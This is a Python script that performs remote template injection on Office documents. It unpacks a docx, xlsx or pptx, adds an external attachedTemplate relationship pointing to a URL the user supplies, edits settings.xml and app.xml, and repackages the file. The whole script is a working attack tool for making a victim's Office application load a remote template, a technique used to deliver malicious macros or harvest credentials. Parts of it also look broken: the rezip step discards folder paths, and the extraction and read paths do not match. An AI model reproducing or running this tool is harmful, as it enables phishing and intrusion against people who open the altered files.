import zipfile
import sys
import os
import pathlib
import ntpath
import xml.etree.ElementTree as ET

setting_template = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"change_me_here\" TargetMode=\"External\"/></Relationships>"

if __name__ == '__main__':
    
    curpath = pathlib.Path(__file__).parent.absolute()
    if (len(sys.argv) != 4):
        print("Usage:")
        print("Argv[1]: Path to Document file (docx, xlsx, pptx, ...)")
        print("Argv[2]: URL to remote Template file")
        print("Argv[3]: Name of the Template file")
        exit()
    if (os.path.isfile(sys.argv[1]) != True):
        print("Wrong path to Document file")
        exit()

    uncompress_path = os.path.join(curpath, "temp_data")
    print("Uncompressing... ", end='')
    try:
        with zipfile.ZipFile(sys.argv[1], 'r') as zip_ref:
            zip_ref.extractall("temp_data")
    except zipfile.BadZipFile:
        print("Please provide a Document!")
        exit()
    DocumentType = ""
    if (sys.argv[1].endswith(".docx")):
        DocumentType = "word"
    elif (sys.argv[1].endswith(".xlsx")):
        DocumentType = "xl"
    elif (sys.argv[1].endswith(".pptx")):
        DocumentType = "ppt"
    print("Done!")
    print("Document type: " + DocumentType)

    setting_xml_rels_path = os.path.join(uncompress_path, DocumentType, "_rels", "settings.xml.rels")
    if (os.path.isfile(setting_xml_rels_path)):
        print("This file already has settings.xml.rels files")
        #xml edit here
    else:
        #drop setting.xml.rels
        setting_template = setting_template.replace("change_me_here", sys.argv[2])
        with open(setting_xml_rels_path, 'w') as f:
            f.write(setting_template)
            f.close()
        
        #edit the /docProps/app.xml Template
        app_xml_path = os.path.join(uncompress_path, "docProps", "app.xml")
        app_xml_tree = ET.parse(app_xml_path)
        app_xml_tempalte = app_xml_tree.getroot().find('{http://schemas.openxmlformats.org/officeDocument/2006/extended-properties}Template')
        if (app_xml_tempalte != None): #just edit
            app_xml_tempalte.text = sys.argv[3]
        else: #add new one
            template_entry = ET.Element('{http://schemas.openxmlformats.org/officeDocument/2006/extended-properties}Template')
            template_entry.text = sys.argv[3]
            app_xml_tree.getroot().append(template_entry)
        app_xml_tree.write(app_xml_path, encoding="UTF-8", xml_declaration=True)
        
        #edit the /doctype/setting.xml
        doc_setting_xml_path = os.path.join(uncompress_path, DocumentType, "settings.xml")
        setting_xml_tree = ET.parse(doc_setting_xml_path)
        setting_xml_root = setting_xml_tree.getroot()
        setting_xml_attached = setting_xml_root.find('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}attachedTemplate')
        if (setting_xml_attached == None):
            setting_xml_attached = ET.Element('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}attachedTemplate')
            setting_xml_attached.set("{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id", "rId1")
            setting_xml_root.append(setting_xml_attached)
        else:
            setting_xml_attached.set("{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id", "rId1")
        setting_xml_tree.write(doc_setting_xml_path, encoding="UTF-8", xml_declaration=True)
    #now recompress 
    file_name = ntpath.basename(sys.argv[1])
    file_name = "new_" + file_name
    with zipfile.ZipFile(file_name, 'w') as zipObj:
        for folderName, subfolders, filenames in os.walk(uncompress_path):
            for filename in filenames:
                #create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath, ntpath.basename(filePath))
        zipObj.close()

    
    